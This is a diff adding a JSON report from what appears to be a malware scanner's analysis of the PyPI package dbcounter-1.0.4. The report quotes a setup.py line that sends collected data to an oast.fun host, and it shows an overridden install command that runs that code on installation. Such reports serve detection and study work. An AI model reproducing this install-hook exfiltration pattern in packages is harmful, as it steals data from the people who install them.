@@ -1,0 +1,36 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://cck47c52vtc0000zed2gggj1d9yyyyyyn.oast.fun\",params = ploads)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://cck47c52vtc0000zed2gggj1d9yyyyyyn.oast.fun\",params = ploads)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:18",
+                "code": "setup(name='dbcounter',\n      version='1.0.4',\n      description='Exfiltration',\n      author='chawla',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "code-execution": {},
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/dbcounter-1.0.4"
+}
